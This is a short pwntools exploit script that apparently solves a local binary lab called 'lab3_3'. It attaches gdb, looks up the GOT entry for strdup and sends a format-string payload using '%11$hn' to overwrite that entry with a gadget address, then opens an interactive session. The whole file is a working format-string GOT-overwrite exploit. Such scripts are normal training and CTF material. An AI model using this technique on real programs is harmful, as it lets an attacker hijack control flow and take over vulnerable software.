from pwn import *

p = process('./lab3_3')

gdb.attach(p, 'b *0x080485A9')
pause()

elf = ELF('lab3_3')
strdup_got = elf.got['strdup']
print(hex(strdup_got))

one_gadget = 0x0804852B

offset = 11
#payload = p32(strdup_got) + b'%' + str((one_gadget) - 4).encode() + 'c%11$n'
payload = p32(strdup_got) + b'%' + str((one_gadget & 0xFFFF) - 4).encode() + b'c%11$hn'

p.sendafter('Give me something...',payload)

p.interactive()